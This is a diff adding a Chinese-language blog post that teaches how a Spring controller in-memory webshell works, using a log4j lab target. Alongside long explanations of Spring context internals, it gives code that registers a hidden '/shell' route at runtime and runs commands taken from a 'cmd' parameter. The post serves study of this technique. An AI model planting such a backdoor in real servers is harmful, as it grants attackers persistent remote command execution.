@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Spring controller 内存马 | Ja9er&#39;s Stuido</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://ja9er.github.io/favicon.ico?v=1642068575695">
+<link rel="stylesheet" href="https://ja9er.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Spring controller 内存马学习
+
+PS 菜鸟学习，有不正确之处还望斧正
+
+0X01 开始之前
+需要我们了解什么是内存马？
+在新手阶段我们简单的将其定义为
+
+访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://ja9er.github.io">
+        <img src="https://ja9er.github.io/images/avatar.png?v=1642068575695" class="site-logo">
+        <h1 class="site-title">Ja9er&#39;s Stuido</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://ja9er.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Spring controller 内存马</h2>
+            <div class="post-date">2022-01-13</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="spring-controller-内存马学习">Spring controller 内存马学习</h1>
+<blockquote>
+<p><em>PS 菜鸟学习，有不正确之处还望斧正</em></p>
+</blockquote>
+<h2 id="0x01-开始之前">0X01 开始之前</h2>
+<p>需要我们了解什么是内存马？</p>
+<p>在新手阶段我们简单的将其定义为</p>
+<blockquote>
+<p>访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p>
+</blockquote>
+<p>思考一下在这其中的所需要实现的功能，现在来看就是两个需求</p>
+<blockquote>
+<ol>
+<li>需要一个受控的url</li>
+<li>受控的url接受传参数，且返回响应的结果</li>
+</ol>
+</blockquote>
+<p>在解决这些需求之前，先了解一下MVC结构</p>
+<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/TYIEVg"><img src="https://s4.ax1x.com/2021/12/24/TYIEVg.png" alt="TYIEVg.png" loading="lazy"></a></figure>
+<p>通俗的来说，Controller就是胶水层，负责接收请求，分配给对应的逻辑层处理结果，得出结果之后响应给渲染层</p>
+<p>打开靶场的源码可以看到UserController这个类，不难看出，这里注册路由，然后分配给路由对应的执行方法，这就是所谓的Controller</p>
+<pre><code class="language-java">@RestController
+@RequestMapping(&quot;/user&quot;)
+public class UserController {
+    @Autowired
+    private UserService userService;
+    /**
+     * 注册
+     * @param user 参数封装
+     * @return Result
+     */
+    @PostMapping(value = &quot;/regist&quot;)
+    public Result regist(User user){
+        return userService.regist(user);
+    }
+    /**
+     * 登录
+     * @param user 参数封装
+     * @return Result
+     */
+    @PostMapping(value = &quot;/login&quot;)
+    public Result login(User user){
+        return userService.login(user);
+    }
+}
+</code></pre>
+<p>所以对应的两个需求，都可以在Controller中解决。这也是被称为Spring  Controller 内存马的原因</p>
+<p>面对需求我们需要做到以下三点。</p>
+<blockquote>
+<ol>
+<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；</li>
+<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；</li>
+<li>controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；</li>
+</ol>
+</blockquote>
+<h2 id="0x02-调试">0x02 调试</h2>
+<p>按照环境搭建靶场</p>
+<p>配置一个springboot+log4j+mybits靶场</p>
+<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
+<h3 id="0x02-01-怎么获取上下文">0X02-01 怎么获取上下文?</h3>
+<blockquote>
+<p>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境</p>
+</blockquote>
+<p>在spring中有4种方式能获得当前的上下文环境(context)，上下文可以简单理解为web端处理这个请求时，当前线程内所拥有的各种环境信息和资源。</p>
+<h4 id="方法一getcurrentwebapplicationcontext"><strong>方法一</strong>：getCurrentWebApplicationContext</h4>
+<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+</code></pre>
+<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TYIkqS"><img src="https://s4.ax1x.com/2021/12/24/TYIkqS.png" alt="TYIkqS.png" loading="lazy"></a></figure>
+<p>在spring boot中无法获取</p>
+<h4 id="方法二webapplicationcontextutils"><strong>方法二</strong>：WebApplicationContextUtils</h4>
+<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
+</code></pre>
+<p><strong>拆解分析</strong></p>
+<p><strong>(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()</strong></p>
+<p>在SpringMVC的源代码中提供了一个封装过的ThreadLocal，ThreadLocal就是当前线程的本地存储对象，在每个线程中都创建了一个 ThreadLocalMap 对象，每个线程可以访问自己内部 ThreadLocalMap 对象内的 value。其中保存了每次请求的HttpServletRequest对象</p>
+<p>其实就是上面代码中的<strong>RequestContextHolder</strong></p>
+<blockquote>
+<p>RequestContextHolder：请求上下文持有者，他是通过ThreadLocal放入当前请求线程中的，通过他的静态方法getRequestAttributes可以获取到RequestAttributes，如果我们是web项目，那么他的子类就是ServletRequestAttributes。</p>
+</blockquote>
+<p>现在将其理解为<font color="orange">RequestContextHolder是Spring提供的可以获取HttpServletRequest的一个工具</font></p>
+<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TYImPs"><img src="https://s4.ax1x.com/2021/12/24/TYImPs.png" alt="TYImPs.png" loading="lazy"></a></figure>
+<p>通过((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()就拿到咱们的request对象了。</p>
+<p><strong>RequestContextUtils.getWebApplicationContext</strong></p>
+<p>拿到request对象后再来看看这个函数，顾名思义，一看就是获取Web上下文的地方</p>
+<p>看看源码</p>
+<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TYIu2q"><img src="https://s4.ax1x.com/2021/12/24/TYIu2q.png" alt="TYIu2q.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TYInGn"><img src="https://s4.ax1x.com/2021/12/24/TYInGn.png" alt="TYInGn.png" loading="lazy"></a></figure>
+<p>终于在<font color="red">request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE)</font>这里拿到了<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code>的webapplicationContext。</p>
+<p>DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE的值的来源是DispatcherServlet初始化的时候</p>
+<pre><code class="language-java">public static final String WEB_APPLICATION_CONTEXT_ATTRIBUTE = DispatcherServlet.class.getName() + &quot;.CONTEXT&quot;;
+</code></pre>
+<blockquote>
+<p>PS 这个函数实际已经拿到了上下文，这也就是为什么方法三能简略到方法二的原因</p>
+</blockquote>
+<p><strong>提出疑问，为什么能从request中获取上下文呢?</strong></p>
+<p>还是要回到Spring MVC 的结构中的<code>DispatcherServlet</code></p>
+<p>DispatcherServlet是spring框架实现的前端控制器。作为一个Servlet，所有的 Web 请求都需要通过它来处理，进行转发，匹配，数据处理后，并转由页面进行展现，它可以说是 SpringMVC 最核心的部分。除此之外 SpringMVC 还有不同的 HandlerMapping 映射策略，各种 Controller 控制器的实现，各种视图解析，拦截器，LocalResolver 国际化处理。</p>
+<p>在完成对 ContextLoaderListener 的初始化后，Web 容器开始初始化 DispatcherServlet。 DispatcherServlet 会建立自己的上下文来持有SpringMVC的Bean 对象，过程是首先从 ServletContext 中获 取上下文作为自己的父上下文，再对自己的上下文进行初始化，最后存储到 ServletContext 中。</p>
+<p>可以在下图中看到DispatcherServlet继承了FrameworkServlet</p>
+<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TYIQMV"><img src="https://s4.ax1x.com/2021/12/24/TYIQMV.png" alt="TYIQMV.png" loading="lazy"></a></figure>
+<p>在FrameworkServlet中存在<strong>processRequest</strong>方法，利用该方法重写了doget(),doPost()等servlet该有的方法</p>
+<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TYIlrT"><img src="https://s4.ax1x.com/2021/12/24/TYIlrT.png" alt="TYIlrT.png" loading="lazy"></a></figure>
+<p>我们可以根据processRequest方法看出:<strong>initContextHolders</strong>绑定了request和localeContext，这也就是为什么</p>
+<p>request能取出上下文的原因</p>
+<pre><code class="language-java">protected final void processRequest(HttpServletRequest request, HttpServletResponse response)
+throws ServletException, IOException {
+long startTime = System.currentTimeMillis();
+Throwable failureCause = null;
+//获取上一个请求保存的LocaleContext
+    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();
+//建立新的LocaleContext
+    LocaleContext localeContext = buildLocaleContext(request);
+//获取上一个请求保存的RequestAttributes
+    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();
+//建立新的RequestAttributes
+    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, 
+response, previousAttributes);
+    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
+asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), 
+new RequestBindingInterceptor());
+//具体设置的方法
+    initContextHolders(request, localeContext, requestAttributes);
+</code></pre>
+<p><strong>现在来分析<code>WebApplicationContextUtils.getWebApplicationContext</code>方法源码</strong></p>
+<pre><code class="language-java">//第一步
+public static WebApplicationContext getWebApplicationContext(ServletContext sc) {
+        return getWebApplicationContext(sc, WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
+    }
+
+//第二步
+public static WebApplicationContext getWebApplicationContext(ServletContext sc, String attrName) {
+        Assert.notNull(sc, &quot;ServletContext must not be null&quot;);
+    	//attrName就是org.springframework.web.context.WebApplicationContext.ROOT
+        Object attr = sc.getAttribute(attrName);
+        if (attr == null) {
+            return null;
+        } else if (attr instanceof RuntimeException) {
+            throw (RuntimeException)attr;
+        } else if (attr instanceof Error) {
+            throw (Error)attr;
+        } else if (attr instanceof Exception) {
+            throw new IllegalStateException((Exception)attr);
+        } else if (!(attr instanceof WebApplicationContext)) {
+            throw new IllegalStateException(&quot;Context attribute is not of type WebApplicationContext: &quot; + attr);
+        } else {
+            return (WebApplicationContext)attr;
+        }
+    }
+</code></pre>
+<p>跟进到方法内可以看到</p>
+<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TYIFr8"><img src="https://s4.ax1x.com/2021/12/24/TYIFr8.png" alt="TYIFr8.png" loading="lazy"></a></figure>
+<p>该函数有两个参数,ServletContext和获取属性的字符串。ServletContext官方叫servlet上下文。JavaEE标准规定：在项目启动时，<strong>Servlet容器（Tomcat、Jboss等）<strong>需要给项目初始化一个</strong>ServletContext</strong>。作为公共环境容器存放公共信息，而ServletContext中的信息都是由容器提供的。服务器会为每一个工程创建一个对象，这个对象就是ServletContext对象。这个对象全局唯一，而且工程内部的所有servlet都共享这个对象。所以叫全局应用程序共享对象。而<font color="red">WebApplicationContext 是 SpringMVC 中对 ApplicationContext 的具体实现</font>，每个 ServletContext 下只会有一个 WebApplicationContext ，在应用初始化时就创建出来了，而不是等浏览器请求来了才创建。</p>
+<p>可以在 org.springframework.web.context的 contextloader.initWebApplicationContext中观察到</p>
+<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TYIKx0"><img src="https://s4.ax1x.com/2021/12/24/TYIKx0.png" alt="TYIKx0.png" loading="lazy"></a></figure>
+<p>其原理十分简单，<font color="red">在spring容器初始化的方法ContextLoader.initWebApplicationContext(ServletContext)中通过servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, this.context);</font>已经将WebApplicationContext的实例放入ServletContext 中了。</p>
+<p>然后在工具类的WebApplicationContextUtils.getWebApplicationContext(ServletContext)方法中就可以通过传入的ServletContext参数获取到WebApplicationContext实例了。<br>
+<strong>结果</strong></p>
+<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TYIiKf"><img src="https://s4.ax1x.com/2021/12/24/TYIiKf.png" alt="TYIiKf.png" loading="lazy"></a></figure>
+<h4 id="方法三-requestcontextutils-是方法二的简化">方法三: RequestContextUtils 是方法二的简化</h4>
+<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
+</code></pre>
+<p>其实在方法二中我们已经可以看到拿到request对象后已经能直接getAttribute获取上下文,实际上我们做个比较就能判断两者是否一致</p>
+<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TYI1qU"><img src="https://s4.ax1x.com/2021/12/24/TYI1qU.png" alt="TYI1qU.png" loading="lazy"></a></figure>
+<h4 id="方法四-getattribute">方法四: getAttribute</h4>
+<pre><code>WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+</code></pre>
+<p>在上文的分析中，我们知道RequestContextHolder可以直接拿到request。</p>
+<p>但是为什么呢?</p>
+<p>我们接着看他的源码</p>
+<pre><code class="language-java">public abstract class RequestContextHolder {
+    private static final boolean jsfPresent = ClassUtils.isPresent(&quot;javax.faces.context.FacesContext&quot;, RequestContextHolder.class.getClassLoader());
+    private static final ThreadLocal&lt;RequestAttributes&gt; requestAttributesHolder = new NamedThreadLocal(&quot;Request attributes&quot;);
+    private static final ThreadLocal&lt;RequestAttributes&gt; inheritableRequestAttributesHolder = new NamedInheritableThreadLocal(&quot;Request context&quot;);
+
+    public RequestContextHolder() {
+    }
+
+    public static RequestAttributes getRequestAttributes() {
+        RequestAttributes attributes = (RequestAttributes)requestAttributesHolder.get();
+        if (attributes == null) {
+            attributes = (RequestAttributes)inheritableRequestAttributesHolder.get();
+        }
+
+        return attributes;
+    }
+    public static RequestAttributes currentRequestAttributes() throws IllegalStateException {
+        RequestAttributes attributes = getRequestAttributes();
+    ......................
+</code></pre>
+<p>可以看到getRequestAttributes直接从ThreadLocal取出attributes,ThreadLocal是什么不再赘述。</p>
+<p>ThreadLocal的值又是来自上文分析的processRequest中的initContextHolders设置的，而实际上只要跟一下initContextHolders就可以发现塞了上下文进去，所以在这里能通过ThreadLocal取到上下文</p>
+<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TYI8ZF"><img src="https://s4.ax1x.com/2021/12/24/TYI8ZF.png" alt="TYI8ZF.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TYIJIJ"><img src="https://s4.ax1x.com/2021/12/24/TYIJIJ.png" alt="TYIJIJ.png" loading="lazy"></a></figure>
+<h3 id="0x02-02-怎么手动注册">0X02-02 怎么手动注册?</h3>
+<p>还是需要先了解一下前置知识，什么是Spring  Bean</p>
+<blockquote>
+<ul>
+<li>bean是对象，一个或者多个不限定</li>
+<li>bean由Spring中一个叫IoC的东西管理</li>
+<li>我们的应用程序由一个个bean构成</li>
+</ul>
+</blockquote>
+<p>再理解一下什么叫IOC容器</p>
+<blockquote>
+<p>IOC容器就是具有依赖注入功能的容器，IOC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。应用程序无需直接在代码中new相关的对象，应用程序由IOC容器进行组装。在Spring中BeanFactory是IOC容器的实际代表者。</p>
+</blockquote>
+<p>最重要的:<font color="red">由IOC容器管理的那些组成应用程序的对象我们就叫它Bean</font>， Bean就是由Spring容器初始化、装配及管理的对象，除此之外，bean就与应用程序中的其他对象没有什么区别了。</p>
+<p>可以参考下这篇文章理解</p>
+<blockquote>
+<p>https://www.cnblogs.com/linjiqin/archive/2013/11/04/3407126.html</p>
+</blockquote>
+<pre><code class="language-java">/*
+如何获取IOC容器并完成我们需要的功能呢？首先应该实例化一个IOC容器，然后从容器中获取需要的对象，然后调用接口完成我们需要的功能，代码示例如下
+*/
+public class HelloServiceTest {
+    @Test
+    public void testHelloWorld() {
+        // 1、读取配置文件实例化一个IOC容器
+        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;helloworld.xml&quot;);
+        // 2、从容器中获取Bean，注意此处完全“面向接口编程，而不是面向实现”
+        HelloService helloService = context.getBean(&quot;helloService&quot;, HelloService.class);
+        // 3、执行业务逻辑
+        helloService.sayHello();
+    }
+}
+</code></pre>
+<p>在参考文章中看到了熟悉的字眼<strong>ApplicationContext context</strong>。经过上面的学习，我们知道ApplicationContext 是容器初始化后的上下文,这里为啥跟IOC容器关联起来了呢。</p>
+<p>原因如下</p>
+<blockquote>
+<p>在Spring IOC容器的代表就是org.springframework.beans包中的BeanFactory接口，BeanFactory接口提供了IOC容器最基本功能；而org.springframework.context包下的ApplicationContext接口扩展了BeanFactory</p>
+</blockquote>
+<p>这一点跟一下代码就知道了</p>
+<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TYIti9"><img src="https://s4.ax1x.com/2021/12/24/TYIti9.png" alt="TYIti9.png" loading="lazy"></a></figure>
+<p>现在言归正传，我们知道在spring 中全都可以看做bean。那么我们之前静态的注册requestMapping的方法是否也可以看做一个bean呢?</p>
+<p>答案是可以的。</p>
+<pre><code class="language-java">// 从context中获得 RequestMappingHandlerMapping 的实例
+RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+</code></pre>
+<p>RequestMappingHandlerMapping对象是用于注册controller的</p>
+<p>它继承了AbstractHandlerMethodMapping，在AbstractHandlerMethodMapping中提供了registerMapping方法</p>
+<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TYINGR"><img src="https://s4.ax1x.com/2021/12/24/TYINGR.png" alt="TYINGR.png" loading="lazy"></a></figure>
+<p>需要三个参数</p>
+<ol>
+<li>
+<p>mapping需要提供一个RequestMappingInfo类的实例。</p>
+<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TYIaxx"><img src="https://s4.ax1x.com/2021/12/24/TYIaxx.png" alt="TYIaxx.png" loading="lazy"></a></figure>
+<p>RequestMappingInfo其实就是@RequestMapping注解里面提供信息的一个包装类，这里我们只用设置url和method</p>
+<pre><code class="language-java">// 定义访问 controller 的 URL 地址
+PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
+// 定义允许访问 controller 的 HTTP 方法（GET/POST）
+RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+//注册mappinginfo信息
+RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+</code></pre>
+</li>
+<li>
+<p>hanlder表示处理该url的类的实例，内存马肯定是恶意类这个类，但是如果new 这个类的话就会一直循环，所以我们可以整一个有参构造方法避免循环</p>
+<pre><code class="language-java">// 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
+InjectToController injectToController = new InjectToController(&quot;aaa&quot;);
+</code></pre>
+</li>
+<li>
+<p>Method就是分配给该路由的方法，这里我们可以利用反射获取该恶意类的方法。方法里可以写任何你想要的东西</p>
+<pre><code class="language-java">// 通过反射获得自定义恶意类中test的 Method 对象
+Method method2 = InjectToController.class.getMethod(&quot;test&quot;);
+</code></pre>
+</li>
+</ol>
+<p>最后整合上面的信息注册:</p>
+<pre><code class="language-java">mappingHandlerMapping.registerMapping(info, injectToController, method2);
+</code></pre>
+<h3 id="0x02-03-自定义方法回显">0x02-03 自定义方法，回显</h3>
+<p>在之前其实已经谈过这个问题，目标就是获取输入并且输出。</p>
+<p>所以我们需要获取当前的request和response两个对象。</p>
+<p>还是可以用之前提过的RequestContextHolder这个工具类来实现，实际上在上文中我们已经利用它来获取request了</p>
+<pre><code class="language-java">// 获取request和response对象
+HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+</code></pre>
+<p>在request中接受我们想要的参数，在java代码中执行该参数的值,这里输出response时可以用getwriter和getOutputStream</p>
+<pre><code class="language-java">// 获取cmd参数并执行命令
+String cmd= request.getParameter(&quot;cmd&quot;);
+String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
+response.getOutputStream().println(res);
+response.flushBuffer();
+</code></pre>
+<h2 id="0x03-效果演示">0X03 效果演示</h2>
+<p>访问靶机/shell路径为404</p>
+<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TYIwM6"><img src="https://s4.ax1x.com/2021/12/24/TYIwM6.png" alt="TYIwM6.png" loading="lazy"></a></figure>
+<p>使用靶机-log4j远程命令执行，注入恶意类</p>
+<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TYI0sK"><img src="https://s4.ax1x.com/2021/12/24/TYI0sK.png" alt="TYI0sK.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TYIrZD"><img src="https://s4.ax1x.com/2021/12/24/TYIrZD.png" alt="TYIrZD.png" loading="lazy"></a></figure>
+<p>再次访问/shell?cmd=whoami,已经得到回显</p>
+<p><a href="https://imgtu.com/i/TYIsde"><img src="https://s4.ax1x.com/2021/12/24/TYIsde.png" alt="TYIsde.png" loading="lazy"></a><br>
+弹个计算器试试<br>
+<a href="https://imgtu.com/i/TYbOqP"><img src="https://s4.ax1x.com/2021/12/24/TYbOqP.gif" alt="TYbOqP.gif" loading="lazy"></a></p>
+<h2 id="参考文章">参考文章</h2>
+<blockquote>
+<p>https://blog.csdn.net/x_iya/article/details/77758069 bean和webapplication</p>
+<p>https://www.cnblogs.com/rancho-blog/p/7011176.html servletcontext初始化时创建webapplicationContext</p>
+<p>https://blog.csdn.net/qq_42154259/article/details/107343764  求上下文持有者：RequestContextHolder</p>
+<p><strong>为啥request能取出上下文</strong></p>
+<p>https://blog.csdn.net/liqun_super/article/details/107999644  Spring MVC 之RequestContextHolder</p>
+<p>**https://www.cnblogs.com/shuilangyizu/p/8621669.html</p>
+<p>https://www.jianshu.com/p/58d3ed37a20c 什么是Spring bean</p>
+<p>https://blog.csdn.net/jike11231/article/details/106229560</p>
+<p>https://blog.csdn.net/weixin_44580977/article/details/103949602</p>
+<p>https://blog.csdn.net/liangsheng_g/article/details/110855327</p>
+<p>https://www.cnblogs.com/bitterz/p/14820898.html</p>
+<p>https://www.cnblogs.com/xiaoxi/p/6164383.html</p>
+<p>https://blog.csdn.net/GAMEloft9/article/details/81625348</p>
+<p>https://www.cnblogs.com/chenbenbuyi/p/7470834.html</p>
+</blockquote>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/">
+                  <h3 class="post-title">
+                    Log4j-年轻人的第一次研究
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
